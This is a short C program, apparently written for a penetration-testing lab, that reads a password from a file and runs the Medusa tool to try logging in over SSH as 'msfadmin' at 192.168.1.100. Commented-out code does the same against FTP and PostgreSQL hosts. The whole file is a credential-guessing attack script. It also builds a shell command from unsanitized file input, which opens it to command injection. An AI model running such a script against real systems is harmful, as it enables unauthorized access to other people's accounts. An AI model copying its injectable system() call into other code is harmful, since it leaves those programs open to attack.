#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <input_file>\n", argv[0]);
        return 1;
    }

    // Read input file
    FILE *file = fopen(argv[1], "r");
    if (!file) {
        perror("fopen");
        return 1;
    }

    char password[256];
    if (fgets(password, sizeof(password), file) == NULL) {
        perror("fgets");
        fclose(file);
        return 1;
    }
    fclose(file);

    // Remove newline character from password
    password[strcspn(password, "\n")] = 0;

    // Hardcoded target and username information
    const char *target_ssh = "192.168.1.100";
    const char *username_ssh = "msfadmin";

    // const char *target_ftp = "192.168.1.2";
    // const char *username_ftp = "msfadmin";

    // const char *target_postgres = "192.168.1.3";
    // const char *username_postgres = "postgres";

    // Run Medusa with extracted password for each module
    char command[1024];

    snprintf(command, sizeof(command), "medusa -h %s -u %s -p %s -M ssh -n 22", target_ssh, username_ssh, password);
    system(command);

    // snprintf(command, sizeof(command), "medusa -h %s -u %s -p %s -M ftp", target_ftp, username_ftp, password);
    // system(command);

    // snprintf(command, sizeof(command), "medusa -h %s -u %s -p %s -M postgres", target_postgres, username_postgres, password);
    // system(command);

    return 0;
}